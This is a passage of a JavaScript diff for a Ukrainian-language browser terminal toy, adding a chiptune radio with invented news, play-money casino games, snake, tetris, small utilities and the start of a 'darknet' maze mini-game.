+      audioBeatTimer=setTimeout(playJingle,note[1]+10);
+    }
+    playJingle();
+    return;
+  }
+  scheduleNextNote();
+}
+
+C['радіо']=C['radio']=function(a){
+  if(a[0]==='вимк'||a[0]==='off'){C['стоп']();return;}
+  pr2('📻 Радіо увімкнено! + / - для станцій, "стоп" щоб вимкнути','ok');
+  pr2('  🎵 Чіпова музика грає через динамік!','info');
+  gameMode='radio';rSt={st:0,song:0,pos:0};
+  startRadioAudio();
+  renderRadio();
+  rSt.iv=setInterval(function(){
+    if(gameMode!=='radio'){clearInterval(rSt.iv);return;}
+    var s=radioSt[rSt.st];
+    rSt.pos=(rSt.pos+1)%(s.songs[rSt.song].length+20);
+    if(rSt.pos===0)rSt.song=(rSt.song+1)%s.songs.length;
+    renderRadio();
+  },280);
+};
+
+// All news blocks for the dedicated news station
+var ALL_NEWS=[
+  '🔴 НОВИНИ УТ-1\nВерховна Рада прийняла закон про\nрозвиток цифрової економіки.\nЗа проголосували 287 депутатів.',
+  '📡 НОВИНИ\nПрезидент підписав указ про\nрозвиток ІТ-галузі в Україні.\nОчікується зростання на 15%.',
+  '🔴 НОВИНИ\nКиїв увійшов до топ-10 міст\nЄвропи за розвитком стартапів.\nАналіз провів Bloomberg.',
+  '📡 ЕКОНОМІКА\nНБУ зберіг облікову ставку\nна рівні 13.5% річних.\nНаступне засідання — у вересні.',
+  '🔴 СПОРТ\nДинамо Київ перемогло 3:1\nу матчі Ліги Конференцій.\nГоли: Цитаїшвілі, Попов (×2).',
+  '📡 ПОГОДА\nПо всій Україні очікується\nтепла сонячна погода.\nТемпература: +22...+28°C.',
+  '🔴 ТЕХНОЛОГІЇ\nУкраїна запустила новий\nсупутник зв\'язку на орбіту.\nМісія успішна, зв\'язок встановлено.',
+  '📡 КУЛЬТУРА\nКиївська філармонія відкриває\nновий концертний сезон 2024.\nПерший виступ — 15 вересня.',
+  '🔴 НОВИНИ\nУкраїна підписала угоду про\nспівпрацю з ЄС у сфері енергетики.\nОчікується зниження тарифів.',
+  '📡 СУСПІЛЬСТВО\nУ Львові відкрили найбільший\nIT-кампус Східної Європи.\nПрацюватиме 5000 фахівців.',
+];
+var newsChState={idx:0,charIdx:0,typingIv:null,blockIdx:0};
+
+function renderNewsChannel(){
+  clrClass('radio-row');
+  function addR(t,c){var el=document.createElement('div');el.className='line radio-row';el.style.color=c||'#fff';el.style.fontFamily='monospace';el.textContent='  '+t;ow.appendChild(el);}
+
+  var s=radioSt[5]; // news station
+  var bars=Math.floor(s.sig/5);
+  addR('╔════════════════════════════════════╗','#ff5555');
+  addR('║  📻 '+s.name.padEnd(32)+'║','#ffff55');
+  addR('║  Сигнал: ['+'█'.repeat(bars)+' '.repeat(20-bars)+'] '+s.sig+'%    ║',s.sig>80?'#55ff55':'#ffff55');
+  addR('╠════════════════════════════════════╣','#ff5555');
+  addR('║  🔴 ЖИВИЙ ЕФІР — НОВИНИ УКР.РАДІО ║','#ff5555');
+  addR('╠════════════════════════════════════╣','#ff5555');
+
+  // News content area — 5 lines reserved
+  for(var i=0;i<5;i++){
+    var el=document.createElement('div');
+    el.className='line radio-row';
+    el.style.color='#ffffff';
+    el.id='news-line-'+i;
+    el.textContent='  ║                                    ║';
+    ow.appendChild(el);
+  }
+  addR('╠════════════════════════════════════╣','#ff5555');
+
+  // Station list
+  radioSt.forEach(function(st,i){
+    var mark=i===5?'►':'  ';
+    addR('║ '+mark+' '+(i+1)+'. '+st.name.padEnd(31)+'║',i===5?'#ffff00':'#555');
+  });
+  addR('╠════════════════════════════════════╣','#ff5555');
+  addR('║  [+/-] станція  [1-6] вибір  стоп  ║','#444');
+  addR('╚════════════════════════════════════╝','#ff5555');
+  ow.scrollTop=ow.scrollHeight;
+
+  // Start news typing
+  startNewsChannel();
+}
+
+function startNewsChannel(){
+  if(newsChState.typingIv)clearInterval(newsChState.typingIv);
+  var block=ALL_NEWS[newsChState.blockIdx%ALL_NEWS.length];
+  newsChState.blockIdx++;
+  var lines=block.split('\n');
+  var charTotal=block;
+  var ci2=0;
+
+  newsChState.typingIv=setInterval(function(){
+    if(gameMode!=='radio'||rSt.st!==5){clearInterval(newsChState.typingIv);return;}
+    if(ci2>=block.length){
+      clearInterval(newsChState.typingIv);
+      // Next block after pause
+      setTimeout(function(){
+        if(gameMode==='radio'&&rSt.st===5)startNewsChannel();
+      },3000);
+      return;
+    }
+    // Update the 5 line slots
+    var sofar=block.slice(0,ci2+1);
+    var slines=sofar.split('\n');
+    for(var li=0;li<5;li++){
+      var el=document.getElementById('news-line-'+li);
+      if(el){
+        var txt=slines[li]||'';
+        el.textContent='  ║  '+(txt.length>32?txt.slice(0,32):txt.padEnd(32))+'║';
+        el.style.color=li===0?'#ff5555':'#fff';
+      }
+    }
+    // Beep on each non-space char
+    if(block[ci2]!==' '&&block[ci2]!=='\n')playNewsBeep();
+    ci2++;
+    ow.scrollTop=ow.scrollHeight;
+  },60);
+}
+
+function renderRadio(){
+  if(rSt.st===5){renderNewsChannel();return;}
+  clrClass('radio-row');
+  var s=radioSt[rSt.st];
+  var m=STATION_MUSIC[rSt.st];
+  var hasNoise=s.sig<100&&Math.random()>(s.sig/100);
+  function addR(t,c){var el=document.createElement('div');el.className='line radio-row';el.style.color=c||'#55ffff';el.textContent='  '+t;ow.appendChild(el);}
+  addR('╔══════════════════════════════════╗');
+  addR('║  📻 '+s.name.padEnd(30)+'║','#ffff55');
+  var bars=Math.floor(s.sig/5);
+  addR('║  Сигнал: ['+'█'.repeat(bars)+' '.repeat(20-bars)+'] '+s.sig+'%  ║',s.sig>80?'#55ff55':s.sig>50?'#ffff55':'#ff5555');
+  var waveIcon={sine:'〜〜〜 SINE',square:'⊓⊔⊓ SQUARE',sawtooth:'/\\/\\ SAW',triangle:'/\\/  TRI'};
+  addR('║  🎵 '+(waveIcon[m.wave]||m.wave).padEnd(28)+'  ║','#ff55ff');
+  addR('╠══════════════════════════════════╣');
+  var song=hasNoise?'~~~ ПОМЕХИ ~~~ '+Array(6).fill(0).map(function(){return String.fromCharCode(65+rnd(26));}).join(''):'♪ '+s.songs[rSt.song];
+  var maxW=32,pad='     '+song+'     ',scroll=rSt.pos%pad.length;
+  var vis=(pad+pad).slice(scroll,scroll+maxW).padEnd(maxW,' ');
+  addR('║  '+vis+'  ║',hasNoise?'#ff5555':'#55ff55');
+  var eq='';
+  for(var i=0;i<18;i++){
+    var h=hasNoise?rnd(8):Math.floor(Math.abs(Math.sin(Date.now()/150+i*0.5+(rSt.st*1.3)))*7.5);
+    eq+=EQ[Math.min(h,7)];
+  }
+  addR('║  '+eq+'              ║','#ff55ff');
+  addR('╠══════════════════════════════════╣');
+  radioSt.forEach(function(st,i){
+    var mark=i===rSt.st?'►':'  ';
+    addR('║ '+(mark)+' '+(i+1)+'. '+st.name.padEnd(28)+'║',i===rSt.st?'#ffff00':'#555');
+  });
+  addR('╠══════════════════════════════════╣');
+  addR('║  [+/-] станція  [1-6] вибір  стоп║','#444');
+  addR('╚══════════════════════════════════╝');
+  ow.scrollTop=ow.scrollHeight;
+}
+
+// ===== КАЗИНО =====
+var money=1000;
+var SUITS=['♠','♥','♦','♣'],VALS=['A','2','3','4','5','6','7','8','9','10','J','Q','K'];
+function newDeck(){var d=[];SUITS.forEach(function(s){VALS.forEach(function(v){d.push({s:s,v:v});});});for(var i=d.length-1;i>0;i--){var j=rnd(i+1),t=d[i];d[i]=d[j];d[j]=t;}return d;}
+function cval(c){if(c.v==='A')return 11;if('JQK'.indexOf(c.v)!==-1)return 10;return parseInt(c.v);}
+function hval(h){var v=0,a=0;h.forEach(function(c){if(c.v==='A')a++;v+=cval(c);});while(v>21&&a>0){v-=10;a--;}return v;}
+function cstr(c){return c.v+c.s;}
+function hstr(h){return h.map(cstr).join(' ');}
+
+C['казино']=C['casino']=function(){pr2('\n🎰 КАЗИНО "ЩАСЛИВА ЗІРКА"\n═══════════════════════════\n💰 Баланс: '+money+' грн\n\nІгри:\n  блекджек [ставка]  — 21\n  рулетка [ставка] [red/black/число] — рулетка\n  покер [ставка]     — відео-покер\n  слот [ставка]      — бандит\n  баланс             — баланс\n','info');};
+C['баланс']=C['balance']=function(){pr2('💰 Баланс: '+money+' грн','ok');};
+
+var bj={deck:[],pl:[],dl:[],bet:0};
+C['блекджек']=C['blackjack']=function(a){
+  var bet=parseInt(a[0])||50;
+  if(bet>money){pr2('Недостатньо коштів! Баланс: '+money+' грн','err');return;}
+  if(bet<=0){pr2('Ставка > 0','err');return;}
+  bj.deck=newDeck();bj.bet=bet;money-=bet;
+  bj.pl=[bj.deck.pop(),bj.deck.pop()];bj.dl=[bj.deck.pop(),bj.deck.pop()];
+  pr2('\n🃏 БЛЕКДЖЕК — Ставка: '+bet+' грн  │  Баланс: '+money+' грн','warn');
+  pr2('─────────────────────────────────');
+  pr2('  Дилер:  [??] '+cstr(bj.dl[1]),'#ff5555');
+  pr2('  Ваша:   '+hstr(bj.pl)+'  ('+hval(bj.pl)+')','#55ff55');
+  pr2('─────────────────────────────────');
+  if(hval(bj.pl)===21){pr2('🎉 БЛЕКДЖЕК!','ok');money+=Math.floor(bet*2.5);pr2('Виграш: '+Math.floor(bet*1.5)+' грн │ Баланс: '+money+' грн','ok');return;}
+  pr2('  взяти / стоп / здатися','info');
+  gameMode='blackjack';
+};
+
+function bjEnd(){
+  pr2('  Дилер:  '+hstr(bj.dl)+'  ('+hval(bj.dl)+')','#ff5555');
+  pr2('  Ваша:   '+hstr(bj.pl)+'  ('+hval(bj.pl)+')','#55ff55');
+  var pv=hval(bj.pl),dv=hval(bj.dl);
+  while(dv<17){bj.dl.push(bj.deck.pop());dv=hval(bj.dl);}
+  if(pv>21)pr2('💥 Перебір! -'+bj.bet+' грн','err');
+  else if(dv>21||pv>dv){money+=bj.bet*2;pr2('🎉 Ви виграли! +'+bj.bet+' грн','ok');}
+  else if(pv===dv){money+=bj.bet;pr2('🤝 Нічия.','warn');}
+  else pr2('😞 Дилер переміг. -'+bj.bet+' грн','err');
+  pr2('💰 Баланс: '+money+' грн','info');
+  gameMode=null;
+}
+
+C['рулетка']=C['roulette']=function(a){
+  var bet=parseInt(a[0])||50,betOn=a[1]||'red';
+  if(bet>money){pr2('Недостатньо коштів!','err');return;}
+  money-=bet;
+  var num=rnd(37),red=[1,3,5,7,9,12,14,16,18,19,21,23,25,27,30,32,34,36];
+  var col=num===0?'зелений':red.indexOf(num)!==-1?'червоний':'чорний';
+  var colE=num===0?'green':red.indexOf(num)!==-1?'red':'black';
+  pr2('\n🎡 РУЛЕТКА — '+bet+' грн на "'+betOn+'"','warn');
+  pr2('  Число: '+String(num).padStart(2)+' │ Колір: '+col,'#ffff00');
+  var win=false,mult=0;
+  if((betOn==='red'||betOn==='червоний')&&colE==='red'){win=true;mult=2;}
+  else if((betOn==='black'||betOn==='чорний')&&colE==='black'){win=true;mult=2;}
+  else if((betOn==='green'||betOn==='зелений')&&colE==='green'){win=true;mult=36;}
+  else if(!isNaN(parseInt(betOn))&&parseInt(betOn)===num){win=true;mult=36;}
+  if(win){money+=bet*mult;pr2('🎉 Виграш! +'+bet*(mult-1)+' грн','ok');}
+  else pr2('😞 Не пощастило. -'+bet+' грн','err');
+  pr2('💰 Баланс: '+money+' грн','info');
+};
+
+var pk={deck:[],hand:[],bet:0,held:[]};
+C['покер']=C['poker']=function(a){
+  var bet=parseInt(a[0])||50;
+  if(bet>money){pr2('Недостатньо коштів!','err');return;}
+  pk.deck=newDeck();pk.bet=bet;pk.held=[];money-=bet;
+  pk.hand=[pk.deck.pop(),pk.deck.pop(),pk.deck.pop(),pk.deck.pop(),pk.deck.pop()];
+  pr2('\n🃏 ВІДЕО-ПОКЕР — Ставка: '+bet+' грн │ Баланс: '+money+' грн','warn');
+  showPoker();
+  pr2('  тримати 1 2 3  →  роздати','info');
+  gameMode='poker';
+};
+function showPoker(){pr2('  '+pk.hand.map(function(c,i){return '['+cstr(c)+']'+(pk.held.indexOf(i)!==-1?'*':' ');}).join(' '),'#55ff55');}
+function pokerRank(h){var v=h.map(function(c){return VALS.indexOf(c.v);}).sort(function(a,b){return a-b;});var s=h.map(function(c){return c.s;});var cnt={};v.forEach(function(x){cnt[x]=(cnt[x]||0)+1;});var c=Object.values(cnt).sort(function(a,b){return b-a;});var fl=s.every(function(x){return x===s[0];});var st=v[4]-v[0]===4&&c[0]===1;if(st&&fl)return[50,'Стрит-флеш!'];if(c[0]===4)return[25,'Каре!'];if(c[0]===3&&c[1]===2)return[9,'Фул хаус!'];if(fl)return[6,'Флеш!'];if(st)return[4,'Стрит!'];if(c[0]===3)return[3,'Трійка!'];if(c[0]===2&&c[1]===2)return[2,'Дві пари!'];if(c[0]===2){var pair=parseInt(Object.keys(cnt).find(function(k){return cnt[k]===2;}));if(pair>=9)return[1,'Пара (J+)!'];}return[0,'Нічого'];}
+
+C['слот']=C['slot']=function(a){
+  var bet=parseInt(a[0])||20;
+  if(bet>money){pr2('Недостатньо коштів!','err');return;}
+  money-=bet;
+  var sym=['🍒','🍋','🍊','🍇','⭐','💎','7','🔔'];
+  var r=[sym[rnd(sym.length)],sym[rnd(sym.length)],sym[rnd(sym.length)]];
+  pr2('\n🎰 БАНДИТ — Ставка: '+bet+' грн','warn');
+  pr2('  ┌──────────────┐');
+  pr2('  │  '+r.join('  ')+'  │','#ffff55');
+  pr2('  └──────────────┘');
+  var win=0;
+  if(r[0]===r[1]&&r[1]===r[2]){
+    if(r[0]==='💎')win=bet*50;else if(r[0]==='7')win=bet*20;else if(r[0]==='⭐')win=bet*10;else win=bet*5;
+    pr2('🎉🎉🎉 ДЖЕКПОТ! Виграш: '+win+' грн','ok');
+  }else if(r[0]===r[1]||r[1]===r[2]||r[0]===r[2]){win=bet*2;pr2('🎊 Два однакових! Виграш: '+win+' грн','ok');}
+  else pr2('😞 Не пощастило. -'+bet+' грн','err');
+  money+=win;
+  pr2('💰 Баланс: '+money+' грн','info');
+};
+
+// ===== ІГРИ =====
+C['стоп']=C['stop']=function(){
+  if(!gameMode){pr2('Нічого не запущено.','warn');return;}
+  clearInterval(tvSt.iv);clearInterval(rSt.iv);
+  stopAudio();
+  ['tv-row','radio-row','snake-row','tetris-row','matrix-row'].forEach(clrClass);
+  hideDpad();tetDrawFn=null;tetCur=null;
+  var m=gameMode;gameMode=null;
+  var names={tv:'📺 ТВ вимкнено',radio:'📻 Радіо вимкнено',snake:'🐍 Змійку зупинено',tetris:'🧩 Тетріс зупинено',matrix:'💚 Matrix зупинено',blackjack:'Блекджек зупинено',poker:'Покер зупинено',guess:'Гру зупинено'};
+  pr2((names[m]||'Зупинено')+'.','ok');
+  document.getElementById('ci').focus();
+};
+
+C['кал']=C['calc']=function(a,raw){
+  var e=raw.replace(/^(кал|calc)\s*/i,'').trim();
+  if(!e){pr2('Використання: кал <вираз>\nПриклад: кал 2+2  кал 10*5  кал 2^8','info');return;}
+  try{if(!/^[\d\s\+\-\*\/\%\^\(\)\.]+$/.test(e)){pr2('Неправильний вираз.','err');return;}pr2(e+' = '+Function('"use strict";return ('+e.replace(/\^/g,'**')+')')(),'ok');}
+  catch(ex){pr2('Помилка обчислення.','err');}
+};
+C['куб']=C['dice']=function(a){var n=Math.min(parseInt(a[0])||1,20),f=['⚀','⚁','⚂','⚃','⚄','⚅'],r=[],t=0;for(var i=0;i<n;i++){var v=rnd(6)+1;r.push(f[v-1]+'('+v+')');t+=v;}pr2('🎲 '+r.join(' '));if(n>1)pr2('Сума: '+t,'ok');};
+C['монета']=C['coin']=function(){pr2(Math.random()<0.5?'🪙 ОРЕЛ':'🪙 РЕШКА','ok');};
+C['жарт']=C['joke']=function(){var j=['Чому програмісти люблять темний режим?\nБо світло приваблює баги!','Скільки програмістів треба щоб замінити лампочку?\nЖодного — це проблема заліза.','SQL-запит приходить до бару\nі питає двох столів: "Можна приєднатися?"','Чому комп\'ютер застудився?\nБо залишив Windows відчиненими.'];pr2('😄 '+j[rnd(j.length)],'info');};
+C['аски']=C['ascii']=function(a,raw){var text=raw.replace(/^(аски|ascii)\s*/i,'').trim().toUpperCase()||'CMD';var art={'A':['  #  ','# # #','#####','#   #','#   #'],'B':['#### ','#   #','#### ','#   #','#### '],'C':[' ####','#    ','#    ','#    ',' ####'],'D':['#### ','#   #','#   #','#   #','#### '],'E':['#####','#    ','###  ','#    ','#####'],'H':['#   #','#   #','#####','#   #','#   #'],'I':['###','  #','  #','  #','###'],'L':['#    ','#    ','#    ','#    ','#####'],'M':['#   #','## ##','# # #','#   #','#   #'],'N':['#   #','##  #','# # #','#  ##','#   #'],'O':[' ### ','#   #','#   #','#   #',' ### '],'P':['#### ','#   #','#### ','#    ','#    '],'R':['#### ','#   #','#### ','# #  ','#  # '],'S':[' ####','#    ',' ### ','    #','#### '],'T':['#####','  #  ','  #  ','  #  ','  #  '],'U':['#   #','#   #','#   #','#   #',' ### '],'W':['#   #','#   #','# # #','## ##','#   #'],'X':['#   #',' # # ','  #  ',' # # ','#   #'],'Y':['#   #',' # # ','  #  ','  #  ','  #  '],'Z':['#####','   # ','  #  ',' #   ','#####'],' ':['  ','  ','  ','  ','  '],'0':[' ## ','#  #','#  #','#  #',' ## '],'1':['  # ',' ## ','  # ','  # ',' ###'],'2':[' ## ','   #',' ## ','#   ','####']};var chars=text.split('').map(function(c){return art[c]||art[' '];});for(var row=0;row<5;row++){var line='';chars.forEach(function(ch){line+=(ch[row]||'  ')+' ';});pr2(line.replace(/#/g,'█'),'ok');}};
+C['матриця']=C['matrix']=function(){pr2('💚 Matrix дощ... (введи "стоп")','ok');gameMode='matrix';var cols=60,rows=16,drops=[];for(var i=0;i<cols;i++)drops[i]=rnd(rows);var chars='アイウエオ0123456789ABCDEF';var miv=setInterval(function(){if(gameMode!=='matrix'){clearInterval(miv);return;}var grid=[];for(var r=0;r<rows;r++)grid[r]='';for(var c=0;c<cols;c++){var col=new Array(rows).fill(' ');col[drops[c]]=chars[rnd(chars.length)];drops[c]=(drops[c]+1)%rows;for(var r2=0;r2<rows;r2++)grid[r2]+=col[r2];}clrClass('matrix-row');for(var r3=0;r3<rows;r3++){var el=document.createElement('div');el.className='line matrix-row';el.style.color='#00ff00';el.textContent=grid[r3];ow.appendChild(el);}ow.scrollTop=ow.scrollHeight;},130);};
+
+var gNum=null,gAtt=0;
+C['вгадай']=C['guess']=function(){gNum=rnd(100)+1;gAtt=0;gameMode='guess';pr2('\n🎯 Вгадай число від 1 до 100!\n"стоп" щоб вийти\n','info');};
+
+// SNAKE
+function startSnake(){
+  var W=32,H=13;
+  var snake=[{x:8,y:6},{x:7,y:6},{x:6,y:6}];
+  snakeDir={x:1,y:0};snakeNextDir={x:1,y:0};
+  var food={x:rnd(W),y:rnd(H)},score=0;
+  showDpad();
+  function draw(){
+    clrClass('snake-row');
+    var grid=[];
+    for(var y=0;y<H;y++){
+      var row='|';
+      for(var x=0;x<W;x++){
+        var c=' ';
+        if(x===food.x&&y===food.y)c='*';
+        for(var s=0;s<snake.length;s++){if(snake[s].x===x&&snake[s].y===y){c=s===0?'O':'o';break;}}
+        row+=c;
+      }
+      row+='|';grid.push(row);
+    }
+    function aR(t,c){var el=document.createElement('div');el.className='line snake-row';el.style.color=c||'#55ff55';el.textContent=t;ow.appendChild(el);}
+    aR('+'+'-'.repeat(W)+'+');
+    grid.forEach(function(r){aR(r);});
+    aR('+'+'-'.repeat(W)+'+');
+    aR('Рахунок: '+score,'#ffff55');
+    ow.scrollTop=ow.scrollHeight;
+  }
+  var iv=setInterval(function(){
+    if(gameMode!=='snake'){clearInterval(iv);clrClass('snake-row');hideDpad();return;}
+    snakeDir=snakeNextDir;
+    var head={x:(snake[0].x+snakeDir.x+W)%W,y:(snake[0].y+snakeDir.y+H)%H};
+    var dead=snake.some(function(s){return s.x===head.x&&s.y===head.y;});
+    if(dead){clearInterval(iv);clrClass('snake-row');hideDpad();pr2('💀 Кінець! Рахунок: '+score,'err');gameMode=null;return;}
+    snake.unshift(head);
+    if(head.x===food.x&&head.y===food.y){score++;food={x:rnd(W),y:rnd(H)};}else snake.pop();
+    draw();
+  },180);
+  // Keyboard fallback
+  document.addEventListener('keydown',function snK(e){
+    if(gameMode!=='snake'){document.removeEventListener('keydown',snK);return;}
+    if(e.key==='ArrowUp'   ||e.key==='w'){dpad('up');   e.preventDefault();}
+    else if(e.key==='ArrowDown' ||e.key==='s'){dpad('down'); e.preventDefault();}
+    else if(e.key==='ArrowLeft' ||e.key==='a'){dpad('left'); e.preventDefault();}
+    else if(e.key==='ArrowRight'||e.key==='d'){dpad('right');e.preventDefault();}
+    else if(e.key==='q'||e.key==='Q'){C['стоп']();}
+  });
+}
+C['змійка']=C['snake']=function(){pr2('🐍 ЗМІЙКА! Керуй кнопками нижче\n','ok');gameMode='snake';startSnake();};
+
+// TETRIS
+var tetCol,tetRotate,tetDrawFn;
+function startTetris(){
+  var W=10,H=16,board=[];for(var y=0;y<H;y++)board[y]=new Array(W).fill(0);
+  var PIECES=[[[1,1,1,1]],[[1,1],[1,1]],[[0,1,0],[1,1,1]],[[1,0],[1,0],[1,1]],[[0,1],[0,1],[1,1]],[[1,1,0],[0,1,1]],[[0,1,1],[1,1,0]]];
+  function newP(){return{shape:PIECES[rnd(PIECES.length)],x:Math.floor(W/2)-1,y:0};}
+  tetCol=function(p,ox,oy,sh){sh=sh||p.shape;for(var r=0;r<sh.length;r++)for(var c=0;c<sh[r].length;c++)if(sh[r][c]){var nx=p.x+c+ox,ny=p.y+r+oy;if(nx<0||nx>=W||ny>=H||(ny>=0&&board[ny][nx]))return true;}return false;};
+  tetRotate=function(sh){var R=sh[0].length,C=sh.length,ro=[];for(var r=0;r<R;r++){ro[r]=[];for(var c=0;c<C;c++)ro[r][c]=sh[C-1-c][r];}return ro;};
+  var cur=newP();tetCur=cur;var score=0,over=false;
+  function place(){for(var r=0;r<cur.shape.length;r++)for(var c=0;c<cur.shape[r].length;c++)if(cur.shape[r][c]){var ny=cur.y+r;if(ny>=0)board[ny][cur.x+c]=1;}var y=H-1;while(y>=0){if(board[y].every(function(c){return c>0;})){board.splice(y,1);board.unshift(new Array(W).fill(0));score+=10;}else y--;}cur=newP();tetCur=cur;if(tetCol(cur,0,0))over=true;}
+  tetDrawFn=function(){
+    clrClass('tetris-row');
+    var d=board.map(function(r){return r.slice();});
+    for(var r=0;r<cur.shape.length;r++)for(var c=0;c<cur.shape[r].length;c++)if(cur.shape[r][c]){var ny=cur.y+r;if(ny>=0)d[ny][cur.x+c]=2;}
+    function aR(t,c){var el=document.createElement('div');el.className='line tetris-row';el.style.color=c||'#c0c0c0';el.textContent=t;ow.appendChild(el);}
+    aR('+'+'-'.repeat(W*2)+'+');
+    for(var y=0;y<H;y++){var row='|';for(var x=0;x<W;x++)row+=d[y][x]?'[]':'  ';row+='|';aR(row);}
+    aR('+'+'-'.repeat(W*2)+'+');
+    aR('Рахунок: '+score+'  ▲=поворот  СТОП=вийти','#ffff55');
+    ow.scrollTop=ow.scrollHeight;
+  };
+  showDpad();
+  var iv=setInterval(function(){
+    if(gameMode!=='tetris'){clearInterval(iv);clrClass('tetris-row');hideDpad();tetDrawFn=null;tetCur=null;return;}
+    if(over){clearInterval(iv);clrClass('tetris-row');hideDpad();pr2('💀 Кінець! Рахунок: '+score,'err');gameMode=null;tetCur=null;return;}
+    if(!tetCol(cur,0,1))cur.y++;else place();
+    tetDrawFn();
+  },520);
+  document.addEventListener('keydown',function tetK(e){
+    if(gameMode!=='tetris'){document.removeEventListener('keydown',tetK);return;}
+    if(e.key==='ArrowLeft') {dpad('left'); e.preventDefault();}
+    else if(e.key==='ArrowRight'){dpad('right');e.preventDefault();}
+    else if(e.key==='ArrowDown') {dpad('down'); e.preventDefault();}
+    else if(e.key==='ArrowUp'||e.key===' '){dpad('up');e.preventDefault();}
+    else if(e.key==='q'||e.key==='Q'){C['стоп']();}
+  });
+}
+C['тетріс']=C['tetris']=function(){pr2('🧩 ТЕТРІС! Керуй кнопками нижче\n','ok');gameMode='tetris';startTetris();};
+
+// ===== DPAD =====
+var snakeDir={x:1,y:0},snakeNextDir={x:1,y:0};
+var tetCur=null; // ref set by tetris
+
+function showDpad(){document.getElementById('dpad').style.display='block';document.getElementById('ci').blur();}
+function hideDpad(){document.getElementById('dpad').style.display='none';}
+
+function dpad(dir){
+  if(gameMode==='snake'){
+    if(dir==='up'   &&snakeDir.y!==1) snakeNextDir={x:0,y:-1};
+    if(dir==='down' &&snakeDir.y!==-1)snakeNextDir={x:0,y:1};
+    if(dir==='left' &&snakeDir.x!==1) snakeNextDir={x:-1,y:0};
+    if(dir==='right'&&snakeDir.x!==-1)snakeNextDir={x:1,y:0};
+    if(dir==='stop'){C['стоп']();}
+  } else if(gameMode==='tetris'){
+    if(dir==='left' &&tetCur&&!tetCol(tetCur,-1,0))tetCur.x--;
+    if(dir==='right'&&tetCur&&!tetCol(tetCur,1,0)) tetCur.x++;
+    if(dir==='down' &&tetCur&&!tetCol(tetCur,0,1)) tetCur.y++;
+    if(dir==='up'){
+      if(tetCur){var r=tetRotate(tetCur.shape);if(!tetCol(tetCur,0,0,r))tetCur.shape=r;}
+    }
+    if(dir==='stop'){C['стоп']();}
+    if(tetDrawFn)tetDrawFn();
+  }
+}
+function tok(str){var tokens=[],cur='',inQ=false;for(var i=0;i<str.length;i++){var c=str[i];if(c==='"'){inQ=!inQ;continue;}if(c===' '&&!inQ){if(cur){tokens.push(cur);cur='';}}else cur+=c;}if(cur)tokens.push(cur);return tokens;}
+
+function exec(raw){
+  raw=(raw||'').trim();if(!raw)return;
+
+  // Game modes
+  if(gameMode==='tv'){
+    if(raw==='+'||raw==='+'){tvSt.ch=(tvSt.ch+1)%tvCh.length;tvSt.fr=0;renderTV();}
+    else if(raw==='-'){tvSt.ch=(tvSt.ch-1+tvCh.length)%tvCh.length;tvSt.fr=0;renderTV();}
+    else if(!isNaN(parseInt(raw))){var n=parseInt(raw)-1;if(n>=0&&n<tvCh.length){tvSt.ch=n;tvSt.fr=0;renderTV();}}
+    else if(raw==='стоп'||raw==='stop'||raw==='тв вимк'){C['стоп']();}
+    else pr2('📺 ТВ: + / - / 1-6 для каналів, "стоп" щоб вимкнути','warn');
+    return;
+  }
+  if(gameMode==='radio'){
+    if(raw==='+'){rSt.st=(rSt.st+1)%radioSt.length;rSt.song=0;rSt.pos=0;startRadioAudio();}
+    else if(raw==='-'){rSt.st=(rSt.st-1+radioSt.length)%radioSt.length;rSt.song=0;rSt.pos=0;startRadioAudio();}
+    else if(!isNaN(parseInt(raw))){var n2=parseInt(raw)-1;if(n2>=0&&n2<radioSt.length){rSt.st=n2;rSt.song=0;rSt.pos=0;startRadioAudio();}}
+    else if(raw==='стоп'||raw==='stop'){C['стоп']();}
+    else pr2('📻 Радіо: + / - / 1-5, "стоп" щоб вимкнути','warn');
+    return;
+  }
+  if(gameMode==='guess'){
+    if(raw==='стоп'||raw==='stop'){C['стоп']();return;}
+    var n3=parseInt(raw);if(isNaN(n3)){pr2('Введи число!','err');return;}
+    gAtt++;
+    if(n3===gNum){pr2('🎉 Правильно! За '+gAtt+' спроб!','ok');gameMode=null;}
+    else pr2((n3<gNum?'⬆️ Більше':'⬇️ Менше')+'! Спроба '+gAtt,'warn');
+    return;
+  }
+  if(gameMode==='matrix'&&(raw==='стоп'||raw==='stop')){C['стоп']();return;}
+  if(gameMode==='blackjack'){
+    if(raw==='взяти'||raw==='hit'){bj.pl.push(bj.deck.pop());var pv=hval(bj.pl);pr2('  Ваша: '+hstr(bj.pl)+'  ('+pv+')','#55ff55');if(pv>=21)bjEnd();}
+    else if(raw==='стоп'||raw==='stand'){bjEnd();}
+    else if(raw==='здатися'||raw==='surrender'){money+=Math.floor(bj.bet/2);pr2('Повернено '+Math.floor(bj.bet/2)+' грн. Баланс: '+money+' грн','warn');gameMode=null;}
+    else pr2('взяти / стоп / здатися','warn');
+    return;
+  }
+  if(gameMode==='poker'){
+    if(raw.startsWith('тримати ')||raw.startsWith('hold ')){
+      pk.held=[];raw.split(' ').slice(1).forEach(function(n){var i=parseInt(n)-1;if(i>=0&&i<5)pk.held.push(i);});
+      pr2('Тримаємо карти: '+pk.held.map(function(i){return i+1+'('+cstr(pk.hand[i])+')';}  ).join(' '),'info');
+    }else if(raw==='роздати'||raw==='deal'){
+      for(var i=0;i<5;i++)if(pk.held.indexOf(i)===-1)pk.hand[i]=pk.deck.pop();
+      showPoker();
+      var rank=pokerRank(pk.hand),mult=rank[0];
+      if(mult>0){money+=pk.bet*mult;pr2('🎉 '+rank[1]+' Виграш: '+pk.bet*mult+' грн','ok');}
+      else pr2('😞 '+rank[1]+' -'+pk.bet+' грн','err');
+      pr2('💰 Баланс: '+money+' грн','info');
+      gameMode=null;
+    }else if(raw==='стоп'){C['стоп']();}
+    else pr2('тримати 1 2 3 / роздати / стоп','warn');
+    return;
+  }
+
+  // Darknet mode
+  if(gameMode==='darknet'){
+    var r2=raw.toLowerCase().trim();
+    function addDX(t,c){var el=document.createElement('div');el.className='line dark-row';el.style.color=c||'#0f0';el.textContent=t;ow.appendChild(el);}
+    // Exit/back
+    if(r2==='exit'||r2==='вихід'||r2==='вих'){
+      if(darkGame){darkGame=null;renderDarknet('games');return;}
+      if(darknetPage!=='main')renderDarknet('main');else exitDarknet();return;
+    }
+    if(r2==='назад'||r2==='back'){
+      if(darkGame){darkGame=null;renderDarknet('games');return;}
+      if(darknetPage!=='main')renderDarknet('main');else exitDarknet();return;
+    }
+    // Active maze game
+    if(darkGame==='maze'){
+      if(r2==='w'||r2==='n')moveMaze(0,-1);
+      else if(r2==='s')moveMaze(0,1);
+      else if(r2==='a')moveMaze(-1,0);
+      else if(r2==='d')moveMaze(1,0);
+      return;
